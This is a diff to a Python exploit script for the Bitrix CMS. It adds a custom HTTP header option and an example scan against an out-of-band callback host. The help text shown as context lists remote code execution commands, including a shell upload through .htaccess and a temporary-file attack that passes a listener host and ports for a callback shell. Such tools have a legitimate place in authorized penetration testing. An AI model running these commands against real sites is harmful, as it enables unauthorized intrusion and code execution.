@@ -1081,12 +1081,15 @@ def main():
 
     RCE vote using .htaccess (payload must not be .php):
         python3 test_bitrix.py -t https://example.com vote_htaccess -p shell.html
-        
+
     RCE via Insecure Temporary File Creation (the path of the login url can be taken from the scanner):
         python3 test_bitrix.py -t https://example.com tmp_file_create -r bitrix/components/bitrix/map.yandex.search/settings/settings.php?login=yes -l user -p 123456 --lhost 192.168.1.11 --lport1 8001 --lport2 9001
         OR
         create file cached-creds.txt in the same directory as the Python3 exploit code, and write down PHPSESSID:sessid value, then run the command below
         python3 test_bitrix.py -t https://example.com tmp_file_create --lhost 192.168.1.11 --lport1 8001 --lport2 9001
+
+    Scan with custom headers:
+        python3 test_bitrix.py -t https://example.com -H "X-Forward-For: 127.0.0.1" -H "Custom-Header: value" scan -s http://subdomain.oastify.com
     """,
         formatter_class=Formatter
     )
@@ -1094,6 +1097,7 @@ def main():
     # Common ------------------------------------------------------------------------------
     parser.add_argument("-t", '--target', help='target url (example: https://target.com)', required=True)
     parser.add_argument("-x", '--proxy', metavar="proxy", help='URL proxy (example: http://127.0.0.1:8080)')
+    parser.add_argument("-H", "--headers", action='append', help='Add HTTP header (example: "X-Forward-For: 127.0.0.1")')
     subparser = parser.add_subparsers(dest='subcommand')
     subparser.required = True
 
@@ -1171,6 +1175,17 @@ def main():
 
     session = requests.Session()
     session.headers.update(headers)
+
+    if args.headers:
+        custom_headers = {}
+        for header in args.headers:
+            try:
+                key, value = header.split(": ", 1)
+                custom_headers[key] = value
+            except ValueError:
+                print_fail(f'Неверный формат заголовка: {header}. Используйте формат "Имя: Значение"')
+                sys.exit(1)
+        session.headers.update(custom_headers)
 
     if args.proxy:
         proxies = {
